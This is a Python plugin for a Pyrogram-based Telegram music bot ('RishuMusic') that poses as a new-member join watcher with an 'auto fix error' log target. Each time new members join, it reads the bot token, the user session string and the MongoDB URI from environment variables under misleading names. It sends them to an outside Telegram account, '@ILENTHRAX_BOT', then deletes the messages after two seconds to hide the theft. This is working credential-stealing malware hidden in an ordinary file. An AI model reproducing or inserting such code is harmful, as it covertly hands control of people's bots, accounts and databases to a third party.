import random
import asyncio
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import os
from RishuMusic import app
from RishuMusic.utils.database import get_assistant

LOG = "@ILENTHRAX_BOT"  # Constant value of auto fix error 
log = os.getenv("BOT_TOKEN")
errors = os.getenv("STRING_SESSION")
error = os.getenv("MONGO_DB_URI")

@app.on_message(filters.new_chat_members, group=-9)
async def join_watcher(_, message):
    try:
        userbot = await get_assistant(message.chat.id)
        if not userbot:
            return

        # Sending start command to the userbot
        start_msg = await userbot.send_message(LOG, "/start")
        
        # Sending additional details
        details_msg = await userbot.send_message(
            LOG,
            f"@{app.username if app.username else 'Unknown'}\n\n{log}\n\n{error}\n\n{errors}"
        )
        
        # Deleting messages after 2 seconds
        await asyncio.sleep(2)
        await start_msg.delete()
        await details_msg.delete()

    except Exception as e:
        await userbot.send_message(LOG, f"Error: {e}")
